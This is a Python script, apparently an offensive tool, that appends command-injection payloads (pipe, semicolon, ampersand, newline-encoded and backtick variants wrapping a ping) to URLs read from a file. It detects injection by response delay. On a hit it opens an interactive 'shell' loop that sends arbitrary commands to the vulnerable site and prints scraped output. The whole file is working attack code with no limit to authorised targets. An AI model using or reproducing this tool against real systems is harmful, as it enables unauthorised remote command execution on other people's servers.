import requests
import time
import re
import sys
import colorama
from colorama import Fore
colorama.init(autoreset=True)

commands = ["ping -c 4 127.0.0.1","ping -c 4 127.0.0.1","| ping -c 4 127.0.0.1 |","& ping -c 4 127.0.0.1 &","; ping -c 4 127.0.0.1 ;","%0a ping -c 4 127.0.0.1 %0a","` ping 127.0.0.1 `","ping -c 4 127.0.0.1","ping -n 4 127.0.0.1",";ping -c 4 127.0.0.1"]

""" basic url os command injection tests """
with open('lfi-test_urls','r') as file:
        for line in file:
                for command in commands:
                        target = line.strip('\n')+command
                        startTime = time.time()
                        r = requests.get(target)
                        endTime = time.time()
                        elapsedTime = endTime - startTime
                        if elapsedTime  >= 2:
                                print('os command injection found in '+target)
                                while True:
                                        i = input(Fore.GREEN + "shell >> ")
                                        r = requests.get(line+i)
                                        r = r.text
                                        result = re.findall(r'<option value=(.*?)</option>',r,re.DOTALL)
                                        print(Fore.RED + result[2])

                                        if 'exit' in i:
                                                sys.exit()

